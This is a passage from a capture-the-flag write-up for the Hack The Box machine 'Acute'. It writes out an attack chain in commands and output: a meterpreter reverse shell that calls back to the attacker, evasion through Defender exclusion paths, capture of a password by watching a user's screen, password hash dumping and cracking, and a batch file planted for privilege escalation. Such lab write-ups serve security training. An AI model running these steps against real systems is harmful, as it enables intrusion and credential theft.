172.16.22.1,tcp,443,Open
172.16.22.1,tcp,445,Open
172.16.22.1,tcp,464,Open
172.16.22.1,tcp,593,Open
172.16.22.1,tcp,636,Open</code></pre>
</doc-codeblock></div>
<p>Looks like this IP is a Domain Controller, as it is running Kerberos and LDAP. Let’s get a real shell by uploading our reverse shell executable. If we try to run executable from either home directory or programdata, it gives us error message. Antivirus is running, probably defender. So, we can query the registry to find whitelisted paths.</p>
<doc-anchor-target id="av-whitelist-paths">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#av-whitelist-paths">#</doc-anchor-trigger>
        <span>AV whitelist paths</span>
    </h3>
</doc-anchor-target>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-powershell"><code v-pre class="language-powershell">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths&quot;

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths
 C:\Utils               REG_DWORD    0x0  
 C:\Windows\System32    REG_DWORD    0x0</code></pre>
</doc-codeblock></div>
<p>As you can see, there are two folders which are whitelisted. We can use <code v-pre>C:\Utils</code> directory to execute our reverse shell. Let’s download our executable there and run it.</p>
<doc-anchor-target id="metasploit-reverse-shell">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#metasploit-reverse-shell">#</doc-anchor-trigger>
        <span>Metasploit reverse shell</span>
    </h3>
</doc-anchor-target>
<p>Create the reverse shell:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=9001 -f exe -o reverse.exe</code></pre>
</doc-codeblock></div>
<p>Setup metasploit handler:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">msf6 &gt; use exploit/multi/handler
msf6 exploit(multi/handler) &gt; set LHOST tun0
msf6 exploit(multi/handler) &gt; set LPORT 9001
msf6 exploit(multi/handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) &gt; run

[*] Started reverse TCP handler on 10.10.14.14:9001</code></pre>
</doc-codeblock></div>
<p>Download the reverse shell to Acute machine and execute:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-powershell"><code v-pre class="language-powershell">cd C:\Utils
curl 10.10.14.14/reverse.exe -o reverse.exe
.\reverse.exe</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="meterpreter-session">
    <h3>
        <doc-anchor-trigger class="header-anchor-trigger" to="#meterpreter-session">#</doc-anchor-trigger>
        <span>Meterpreter Session</span>
    </h3>
</doc-anchor-target>
<p>As the reverse shell is executed in the Acute machine we receive the meterpreter session:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">msf6 exploit(multi/handler) &gt; run
[*] Started reverse TCP handler on 10.10.14.14:9001
[*] Sending stage (200262 bytes) to 10.10.11.145
[*] Meterpreter session 1 opened (10.10.14.14:9001 -&gt; 10.10.11.145:49785 ) at 2022-03-25 09:58:02 +0800

meterpreter &gt; shell
Process 1948 created.
Channel 2 created.
Microsoft Windows [Version 10.0.19044.1466]
(c) Microsoft Corporation. All rights reserved.

C:\Utils&gt;powershell
powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\Utils&gt;</code></pre>
</doc-codeblock></div>
<p>I ran WinPEAS and got this interesting info:
<figure class="content-center">
    <img src="images/image5.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>This means that <code v-pre>edavies</code> is using RDP (gui interface) and is ACTIVE!
We can use a meterpreter module to watch his screen:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">meterpreter &gt; screenshare -q 100
[*] Preparing player...
[*] Opening player at: /home/caue/htb/acute/yiBhXusM.html
[*] Streaming...</code></pre>
</doc-codeblock></div>
<p>While stalking <code v-pre>edavies</code> we see the user opening a PowerShell session and entering some commands:
<figure class="content-center">
    <img src="images/image6.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>This was his commands:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-powershell"><code v-pre class="language-powershell">$pass = ConvertTo-SecureString &quot;W3_4R3_th3_f0rce.&quot; -AsPlaintext -Force  
$cred = New-Object System.Management.Automation.PSCredential (&quot;acute\imonks&quot;, $pass)  
Enter-PSSession -computername ATSSERVER -ConfigurationName dc_manage -credential $cred</code></pre>
</doc-codeblock></div>
<p>He is using the user <code v-pre>imonks</code> credentials to start another session.
Now we can run commands as a new user, lets see what we can find.</p>
<doc-anchor-target id="running-commands-as-imonks">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#running-commands-as-imonks">#</doc-anchor-trigger>
        <span>Running commands as Imonks</span>
    </h2>
</doc-anchor-target>
<p>We can read the flag:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-powershell"><code v-pre class="language-powershell">$SecPassword = ConvertTo-SecureString 'W3_4R3_th3_f0rce.' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('acute\imonks', $SecPassword)
Invoke-Command atsserver -ConfigurationName dc_manage -Credential $Cred -scriptblock { cat c:\users\imonks\Desktop\user.txt }</code></pre>
</doc-codeblock></div>
<p>Query the domain controller about <code v-pre>imonks</code> user:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-powershell"><code v-pre class="language-powershell">Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -credential $cred -ScriptBlock {net user imonks /domain}

User name                    imonks
Full Name                    Ieuan Monks
Comment                      
Users comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            21/12/2021 14:51:31
Password expires             Never
Password changeable          22/12/2021 14:51:31
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   25/03/2022 02:37:08

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         *Managers             
The command completed successfully.</code></pre>
</doc-codeblock></div>
<p>So <code v-pre>imonks</code> is member of &quot;Managers&quot; group. Lets see who else is member of that group:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -credential $cred -ScriptBlock {net user awallace /domain}

User name                    awallace
Full Name                    Aileen Wallace
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            21/12/2021 14:50:36
Password expires             Never
Password changeable          22/12/2021 14:50:36
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   23/12/2021 09:15:29

Logon hours allowed          All

Local Group Memberships      
Global Group memberships     *Domain Users         *Managers</code></pre>
</doc-codeblock></div>
<p>User <code v-pre>awallace</code> is also member of &quot;Managers&quot; group.
We really need is a real shell as <code v-pre>imonks</code> to run more commands. Lets keep enumerating the machine.
If we check the <code v-pre>imonks</code> desktop, we will find a powershell script, <code v-pre>wm.ps1</code>:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-powershell"><code v-pre class="language-powershell">PS C:\Utils&gt; Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -credential $cred -ScriptBlock {ls ../desktop}

Directory: C:\Users\imonks\desktop

Mode                 LastWriteTime         Length Name                               PSComputerName                    
----                 -------------         ------ ----                               --------------                    
-ar---        25/03/2022     00:49             34 user.txt                           ATSSERVER                         
-a----        11/01/2022     18:04            602 wm.ps1                             ATSSERVER 


PS C:\Utils&gt; Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -credential $cred -ScriptBlock {cat ../desktop/wm.ps1}

$securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51'
$passwd = $securepasswd | ConvertTo-SecureString
$creds = New-Object System.Management.Automation.PSCredential (&quot;acute\jmorgan&quot;, $passwd)
Invoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds</code></pre>
</doc-codeblock></div>
<p>If we execute this script, then it sets a secure password, and execute <code v-pre>Get-Volume</code> from <code v-pre>jmorgan</code> user&#x27;s context. We have to edit it script and modify the invoke command.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-powershell"><code v-pre class="language-powershell">PS C:\Utils&gt; Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock{((cat &quot;c:\users\imonks\Desktop\wm.ps1&quot; -Raw) -replace 'Get-Volume','cmd.exe /c c:\utils\reverse.exe') | set-content -path c:\users\imonks\Desktop\wm.ps1} -credential $cred</code></pre>
</doc-codeblock></div>
<p>This command will replace the <code v-pre>Get-Volume</code> string with <code v-pre>cmd.exe /c c:\utils\reverse.exe</code> We already have <code v-pre>reverse.exe</code> in utils directory. So upon execution we get the reverse connection on metasploit. Let’s read the contents of file to make sure our cmd is good to go:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-powershell"><code v-pre class="language-powershell">PS C:\Utils&gt; Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -credential $cred -ScriptBlock {cat ../desktop/wm.ps1}

$securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28dba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51'
$passwd = $securepasswd | ConvertTo-SecureString
$creds = New-Object System.Management.Automation.PSCredential (&quot;acute\jmorgan&quot;, $passwd)
Invoke-Command -ScriptBlock {cmd.exe /c c:\utils\reverse.exe} -ComputerName Acute-PC01 -Credential $creds</code></pre>
</doc-codeblock></div>
<p>Perfect, just need to setup a metasploit handler again and run the script:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-powershell"><code v-pre class="language-powershell">PS C:\Utils&gt; Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock{C:\Users\imonks\Desktop\wm.ps1}</code></pre>
</doc-codeblock></div>
<p>Metasploit handler:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">msf6 exploit(multi/handler) &gt; run

[*] Started reverse TCP handler on 10.10.14.14:9001 
[*] 10.10.11.145 - Meterpreter session 1 closed.  Reason: Died
[*] Sending stage (200262 bytes) to 10.10.11.145
[*] Meterpreter session 2 opened (10.10.14.14:9001 -&gt; 10.10.11.145:49821 ) at 2022-03-25 10:34:04 +0800

meterpreter &gt; shell
Process 2668 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19044.1466]
(c) Microsoft Corporation. All rights reserved.

C:\Users\jmorgan\Documents&gt;whoami
whoami
acute\jmorgan</code></pre>
</doc-codeblock></div>
<doc-anchor-target id="meterpreter-session-as-jmorgan">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#meterpreter-session-as-jmorgan">#</doc-anchor-trigger>
        <span>Meterpreter session as jmorgan</span>
    </h2>
</doc-anchor-target>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">C:\Users\jmorgan\Documents&gt;whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                                     
========================================== ================ ============ ===============================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group             
BUILTIN\Administrators                     Alias            S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group             
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group             
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group             
Mandatory Label\High Mandatory Level       Label            S-1-16-12288</code></pre>
</doc-codeblock></div>
<p>A simple enumeration in the user groups tells us that it is member of <code v-pre>BUILTIN\Administrators</code>. The privilege escalation now seems logic.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">meterpreter &gt; getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM</code></pre>
</doc-codeblock></div>
<p>We may have pwned the administrator, but it is not the actual host. We can confirm by running ipconfig:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">meterpreter &gt; ipconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 14
============
Name         : Microsoft Hyper-V Network Adapter #2
Hardware MAC : 00:15:5d:e8:0a:01
MTU          : 1500
IPv4 Address : 172.16.22.2
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::9513:4361:23ec:64fd
IPv6 Netmask : ffff:ffff:ffff:ffff::</code></pre>
</doc-codeblock></div>
<p>Since we are <code v-pre>Administrator</code> lets dump the hashes:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-none"><code v-pre class="language-none">meterpreter &gt; hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Natasha:1001:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:24571eab88ac0e2dcef127b8e9ad4740:::</code></pre>
</doc-codeblock></div>
<p>Crack it:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-bash"><code v-pre class="language-bash">$ hashcat.exe -m 1000 hashes.txt rockyou.txt

a29f7623fd11550def0192de9246f46b:Password@123</code></pre>
</doc-codeblock></div>
<p>Previously we queried the domain to find member of &quot;Managers&quot; group, there was one user, <code v-pre>awallace</code> , let’s try to use this password from this users context.</p>
<doc-anchor-target id="running-commands-as-awallace">
    <h2>
        <doc-anchor-trigger class="header-anchor-trigger" to="#running-commands-as-awallace">#</doc-anchor-trigger>
        <span>Running commands as awallace</span>
    </h2>
</doc-anchor-target>
<p>Coming back to <code v-pre>edavies</code> PSWA we can now try to send commands as <code v-pre>awallace</code> using the password <code v-pre>Password@123</code>:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-powershell"><code v-pre class="language-powershell">PS C:\Utils&gt; $password = ConvertTo-SecureString &quot;Password@123&quot; -AsPlainText -Force
PS C:\Utils&gt; $cred = New-Object PS C:\Utils&gt; System.Management.Automation.PSCredential(&quot;Acute\AWallace&quot;,$password)
Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -Command {whoami}
  
acute\awallace</code></pre>
</doc-codeblock></div>
<p>Enumerating files and directories there is one that sticks out - <code v-pre>keepmeon</code>:
<figure class="content-center">
    <img src="images/image7.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
</p>
<p>Lets read its content:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-powershell"><code v-pre class="language-powershell">Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -Command {cat 'c:\program files\keepmeon\keepmeon.bat'}

REM This is run every 5 minutes. For Lois use ONLY
@echo off
 for /R %%x in (*.bat) do (
 if not &quot;%%x&quot; == &quot;%~0&quot; call &quot;%%x&quot;
)</code></pre>
</doc-codeblock></div>
<p>This looks like a schedule script, it runs this batch file every five minutes and checks for any .bat files in the parent directory and if there’s a .bat file then it executes it.
The main thing/information is that the script is for only <code v-pre>lois</code> user and we already know that, <code v-pre>lois</code> is the only user who can change group membership.
So, we can create a batch file which gives <code v-pre>awallace</code> user administrator privileges of <code v-pre>site admin</code> group.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-powershell"><code v-pre class="language-powershell">PS C:\Utils&gt; Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock {Set-Content -Path 'c:\program files\Keepmeon\admin.bat' -Value 'net group site_admin awallace /add /domain'}</code></pre>
</doc-codeblock></div>
<p>Check that the file was created:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-powershell"><code v-pre class="language-powershell">PS C:\Utils&gt; Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock {ls 'c:\program files\Keepmeon\'}

Directory: C:\program files\Keepmeon

Mode                 LastWriteTime         Length Name                       PSComputerName                    
----                 -------------         ------ ----                       ---------
-a----         3/25/2022   3:12 AM             44 admin.bat                  ATSSERVER                     
-a----        12/21/2021   2:57 PM            128 keepmeon.bat               ATSSERVER
</code></pre>
</doc-codeblock></div>
<p>Now we need to wait for five minutes to run that schedule job to execute our batch file. Check the whether you added to <code v-pre>site_admin</code> group or not.</p>
<p>Lets check:</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-powershell"><code v-pre class="language-powershell">PS C:\Utils&gt; Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -Command {whoami /groups}</code></pre>
</doc-codeblock></div>
<p><figure class="content-center">
    <img src="images/image8.png" alt="">
    <figcaption class="caption"></figcaption>
</figure>
Yes! We got it.
We are domain admin now. Let’s read the final flag from administrators directory.</p>
<div class="codeblock-wrapper"><doc-codeblock>
<pre class="language-powershell"><code v-pre class="language-powershell">Invoke-Command -ComputerName ATSSERVER -ConfigurationName dc_manage -Credential $cred -ScriptBlock {cat 'c:\users\administrator\desktop\root.txt'}</code></pre>
</doc-codeblock></div>

                                
                                <!-- Required only on API pages -->
                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
                            </div>
                            <footer class="clear-both">
                            
                                <nav class="flex mt-14">
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../purple-team-lab/threadlessstompingkann/">
                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                            <span>
                                                <span class="block text-xs font-normal text-gray-400 dark:text-dark-400">Previous</span>
                                                <span class="block mt-1">Threadless​Stomping​Kann</span>
                                            </span>
                                        </a>
                                    </div>
                            
                                    <div class="w-1/2">
                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-blue-500 dark:text-blue-400 border border-gray-300 hover:border-gray-400 dark:border-dark-650 dark:hover:border-dark-450 rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../writeups/htb/boxes/admirertoo/">
                                            <span>
                                                <span class="block text-xs font-normal text-right text-gray-400 dark:text-dark-400">Next</span>
                                                <span class="block mt-1">Admirer​Too</span>
                                            </span>
                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
                                        </a>
                                    </div>
                                </nav>
                            </footer>
                        </main>
                
                        <div class="border-t dark:border-dark-650 pt-6 mb-8">
                            <footer class="flex flex-wrap items-center justify-between">
                                <div>
                                    <ul class="flex flex-wrap items-center text-sm">
                                    </ul>
                                </div>
                                <div class="docs-copyright py-2 text-gray-500 dark:text-dark-350 text-sm leading-relaxed"><p>© Copyright 2023. Caue All rights reserved.</p></div>
                            </footer>
                        </div>
                    </div>
                
                    <!-- Rendered if sidebar right is enabled -->
                    <!-- Sidebar right skeleton-->
                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-white border-gray-200 lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton dark:bg-dark-850 dark:border-dark-650">
                        <div class="pl-5">
                            <div class="w-32 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-48 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                            <div class="w-40 h-3 mb-4 bg-gray-200 dark:bg-dark-600 rounded-full loading"></div>
                        </div>
                    </div>
                
                    <!-- User should be able to hide sidebar right -->
                    <doc-sidebar-right v-cloak></doc-sidebar-right>
                </div>

            </div>
        </div>
    
        <doc-search-mobile></doc-search-mobile>
        <doc-back-to-top></doc-back-to-top>
    </div>


    <div id="docs-overlay-target"></div>

    <script data-cfasync="false">window.__DOCS__ = { "title": "Acute", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
</body>
</html>
